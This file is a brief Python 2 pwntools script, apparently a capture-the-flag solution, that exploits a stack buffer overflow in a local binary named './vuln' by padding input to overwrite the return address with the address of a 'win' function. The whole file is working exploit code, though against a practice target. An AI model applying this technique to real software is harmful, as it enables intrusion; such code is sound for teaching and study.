# python2
# coding=utf-8
from pwn import *

win=0x080485cb
vuln=0x80486ae

ret=0xffffd5cc
start_get=0xffffd5a0

padding=ret-start_get

p=process('./vuln')
p.recvuntil('Please enter your string:')
p.sendline('a'*padding + p32(win))
print p.recvall()
